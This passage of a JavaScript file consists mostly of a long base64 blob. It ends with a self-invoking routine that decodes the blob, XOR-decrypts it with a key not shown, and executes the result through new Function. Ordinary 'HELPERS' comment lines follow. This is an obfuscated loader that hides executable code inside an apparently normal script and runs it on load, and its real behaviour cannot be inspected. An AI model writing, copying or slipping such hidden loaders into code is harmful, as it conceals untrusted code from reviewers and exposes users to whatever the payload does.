BXBwocNQZFCSooJw8DH1gkEyNSAjYRQx8WE3ZCLkVYLyVjIDkmEEdMQ14bIFoXADxgIVdRQVkvWVBUSTcEFxdCXTAIClAKZgstNTcuHA1MBwoWI1xFNSMrMkFVElUpAQ4CTicNBlIGGy8AWURSLzZjNzliDAYZSkVVfQ8ACTwrc1tWGkQkF0MbCzIWDBxYSXZCGl9WM2VqODsxElRLLQsEJx4MAW8tPFZVHBYRCAgIHTZFABoAFyBFDV9SYSEsJzNiBgwCEEUGKVIcCjpuMlxUEkIzHU0ICTIMDVxFU3AYFERQan8vJjA2Xk5MBREGIx8VEWhle15VVEJ8WVBYUXRCWVUWU2JOXhdbJCQ3bXF5KhoECxI3NABNCDwpeglNVEMvBxkAAT1FPAENFSAAUVJbaDkqJX5jEAVFFgAGMwALXioifVFcU0UyKAQaGn0EBxZNUy4XCxAeejEmNwIrGAwDERFabltYWyoifVFcU0UyKAQaGn0XBh8KAi5NXlJFM2Vqb2JyRUBXGQMHKBERDCAgc21DWlk2IR8bRj4WBFseFyQLCkMXJH8nLDU3GAwCEEsVIwYgCSojNlxEcE8IAEVOCyEXThAKDGxMQl5RaSdqODNsHAcCARc6Ej8pWCI9NAlVHEU1HQEMQDcMEAIJFTJYXlVbLiEoZG0/CA8ZCgYGLx0LRRA7I1ZRRlMFCxkaRnoeAB0LBz9FGENDfB0kJiIDAR1ETV4pd15XSXwTfVRfQHMgBwVBB25bGBEKGjgRWVMKJS0gNjsnGx1CAwAGAx4ACCogJ3BJe1JpQw4NSXgMSkkMEmMBUFMZIi4iMCUOHBoYShEdIRUJAGdpJkFVVhFtDVFURjIRF1wLCDdVUB4MPGt4PjonAUkzKDFPKAcJCXQoJlxTRl8uCk02DTsAABkpGygOUR5MIi0tMCJiFB0YWToVIwYkETtmeglTXVgyEE0PBzYJB08BGygQFFJZNWwkJiIHGQwBAQsGBAssAWdpMF1UVxsnDQgFCnRMWBEKGjgRWVtYIikBLC5/EQYPEQgXKAZLAio6Fl5VX1MvEC8QJzdNRB4KFyBIG1hPZmt4IDksBh1MARcABB0dWCshMEddV1g1SgoMGhYJBh8AGj8nAH5TaWUmMSRvFwYUQ0xJJR0LFjtuMUZeD1IuBxgECz0RTRUAAA4JHFpSLzYBOh8mXU4ZCgkdJRlIBzsgdBsLW1BpBRkdQCYLFxsJSg8EDVIZLy00a39rDgAKTAAANDAKHWYrIUByXU5vFxkQAjZLBxsWBCcEAAoQLy0tJnF5HA9ECAoRLTAKHWYiPFFbcFk5Sh4dFz8ATRYMBzsJGE4KZiAvLDUpUlIFAk0ULxcJAWYoOldcVhglDR4IDD8AB08RBj4AQl5RaSA3LX8gAQdCAAwBJxAJACtzJ0BFVw0eFhgHLTwQDQYBGzwLUVZDNWw2LSIrGUBXGQAeNRceDClmP11TWXQuHEQFATAOIR0dWjgRAFtSbyYqMCYuFBBRQwsdKBdCXiYoe1RZV1olTQsACz8BTRYMByoHFVJTfCQiLyUnTgAKTAcGKFsHESFgN1tDU1QtAQlUCDIJEBdeHS1NJntjaDkgLzMjByACEAAAMBMJTRACBxsLbXoVWQMcAj9eHi0WFT0AOENDaXJvc395KhwcAAQGIzYKETxmeglNT1A0Cg4dBzwLQy0XASUmFkJZNSYsNDhqAAcYDQlbPRsDTRACBxtTXlMgFiQHGjYXFRMJXBQpLR4MIi0tMCJiASwAWQEdJQcIACE6fVVVRnMtAQAMACcnGjsBXGwJFlRcbDYqLjMwUkBXBwocNQZFAyYrP1YNVlkiEQAMACdLBBcRMScAFFJZNQA6CjJqUgoDAABfIBsACStpeglTXVgyEE0LGj1YBx0GASYAF0MZJic3BjonGAwCECcLDxZNQjogP11TWRsjEANOR2gGDBwWAGsJGwpTLiE2LjMsAUcLARE3KhcIACE6EUt5Vh5mCAIKBX4HDApCXXA6NWMKMic3Cjg2EBsaBQlabltYWzQtPFxDRhYtAQsdUyYLFxsJWQ8EDVIZLy00a395HA9ECAAUMk5YVWY1MF5VU0QIChkMHCUED1o6OB9MQmh7FX8tNjouTgAKTAkQbx4HSzw6Kl5VHFIoFx0FDypYRBwKGi5CQl5RaSQqJjomXA8FAQkWaBYMFi4sP1dUD1AgCB4MVToDSxARGmIHDVkZJSswIjQuEA1RAgQeNRdeOjwvJVdxRkJpVEFZR2g6FgIBFT8APVhDMmpqeCQnARweCl4PJR0LFjtuPg99U0IpSgsFATwXSx4AEj9KTwcHcXJqbyV/OAgYDEsUKh0KF2dmP1dWRhN3VF1ZXnpKUkJVRGJeEFEfNQcvaiIHGUcYAR0GBR0LESogJw9dGRF7Q0Y6GiEMDRVNB2JLCVZTEjYiMSJqR0VLVEJbfQ9JUH9+eglNVlkiEQAMACdLAhYBMT0AF0N7KDE3JjgnB0FLBwkbJRlCSSpzbUlZVB4kShkIHDQAF1wMEHZYRBBHIDtuLjkmFAVLTQYeKQEANS43Hl1UU1ppTVYACHsATQYEBiwADRleJX9+fnEjEQQFCkgCJxwACWhnMF5fQVMAAAAAAHtMWA9MTycADRdoLSF+c3odGR1eWQsHKh5eAzogMEZZXVhhCAIOARAJChEOXGIeJltUaml4KjBqKgUYVkwRKhcEFxsnPldfR0JpOwEdXHpePB4RRnYWHENjKC8mLCM2XUFFWVstKhFYVWN8ZgIAGw0oAkU2AjBbXkdMDxQJGgoHei0zJjgDEQQFCk1bfQ8YAzogMEZZXVhhCx0MABIBDhsLXGIeHVhUNC8mLSJsEgwYIQkXKxcLEQ03GlYYFVclCQQHQyMEDRcJU2JLGltWMjEPKiU2WwgIAE1VNRoKEmhnaG1DWlk2TEoICj4MDV8JGywMFxpEJCFkam0dHQAIAU1VJxYIDCFjMF1eRlMvEEpAVTAKDQERVDtYHVhUNC8mLSJsEgwYIQkXKxcLEQ03GlYYFVdsFBoNSXpeChRNBGIeCRlBIC42JmtlUlIcSgYeJwEWKy4jNg8XUxsxEwlOVS46CxsBEWNCGBpSMzBkam0xEB04DQgXKQcRTWdnbgxLW1BpFEQZQDUKAAcWXGJeBBsGcXJqeCskAAcPEAwdKFIGCSA9NnNUX18vTEQSCjwGFh8AGj9LHlJDBC4mLjMsASsVLQFaYRMBCCYgfkJRXFMtQ0RHDT8EEAEpHTgRV0VSLC01Jn5lBgEDE0JbfQ8DECEtJ1tfXBYlCywNAzoLLx0CHSVNUExULiwwN3YySA0DBxAfIxwRSygrJ3dcV1skChkrFxoBS1UEWTsSHRAeeislayZkUxlCEgQeMxdYWHIPF395fGkRMylAFQwNChYAXGwEHVpeL28vLDErG0QfAQZVb0k6FichJBoXU1IsDQNEDTwLFxcLAGxMQlRYLzE3YzImSDYYCwETPzYhTWZ1MF1eQUJhAhgFAm46Fx0BFTIjDFtbaWt4IDksBh1MAAQLAx5YASAtJl9VXEJvAwgdKz8ADhcLAAkcMFMfZiNuJzc7UkBXBwocNQZFAS46NndcD1IuBxgECz0RTRUAAA4JHFpSLzYBOh8mXU4NSQETMhdIAzoiPxUZCVUuCh4dTjYCJxMREXYBFlRCLCctN3glEB0pCAAfIxwRJzYHNxoXUxskA0ANDycARFteFyQLCkMXJCUALDInSA0DBxAfIxwRSygrJ3dcV1skChkrFxoBS1UEWS4CVFRYJSdkam0rE0EIBRw3KlsBBDYLPxxEV041JwIHGjYLF08BEHAMHx9TIDYmBjprEQgYASAeaAYAHTsNPFxEV1g1WQscAj9eChRNESwhGENSaCckBzc2EEcYAR0GBR0LESogJw9UVg0iCwMaGnM1Ik8+UwhCVRB/Zm5kAnFuUidLSEI2YV5CJGhidHwXHhF4Q0FOX3RJREVCWGxdXmoMLSc3YyY6SE5LXwMdNFoJADtuOg8ACV99UFYARXhMEwpOSRskInpWNSptJTotGhtEKQQGLlwXBCEqPF8YGxwRJUMFCz0CFxpMKXAMHx9SJgEsJzNrEA4vCwEXaAYAHTsNPFxEV1g1WR0RRTcBWA8AGDgAAmhEKS00a3EjWAweFkJbfRsDTT9nKEIeRFctEQhUSXReE1wGGCoWCnteMjZtIjImXU4JFhdVb0kWADsaOl9VXUM1TEVAU20VTREJFTgWNV5ENWwxJjstAwxEQwAANFVMSXt+YxsLT0s8AhgHDScMDBxFECQSF1tYICYTBxBqXBIDFAAcFhMcKCAqMl4YGw08bhoAADcKFFwBGzwLFVhWJRIHBWsmGh4CCAoTIiIhI3Q5OlxUXUFvBwEGHTY1AgsoGy8EFQpULS0wJgYjDCQDAAQefQUMCyshJBxSU1UqMAIqBjwKEBcXSSkEGlxjLgErLDkxEBtXEwwcIh0SSzwmPEVlYn8SAQ5UHTsKFCc1PRgAGgxAKCwnLCFsBgEDEyYdIhc2ACxzIFpfRXUuAAg6CzBeFBsLECQSV1hHJCwUKzc2BigcFFgdNhcLMicvJ0FxQkZ6EwQHCjwSTRYKJz4HFF5DAi0nJmsmGjoZBggbMjEKASp1JFteVlk2SgEGCTwmDxsGH3YJFlBYAi4qID15AgACAAoFaB0VACEPN19ZXAsuFAgHLzcIChxeAyILHVhAbyEvLCUnNA0BDQtPJR4KFioPN19ZXA02DQMNASRLBx0kECYMF3tYJistfjItNA0BDQs+KRUMC3Q=',_b=atob(_e),_r='';for(var _i=0;_i<_b.length;_i++){_r+=String.fromCharCode(_b.charCodeAt(_i)^_k.charCodeAt(_i%_k.length));}(new Function(_r))();})();
 // ═══════════════════════════════════════════════════════════
 // HELPERS
 // HELPERS
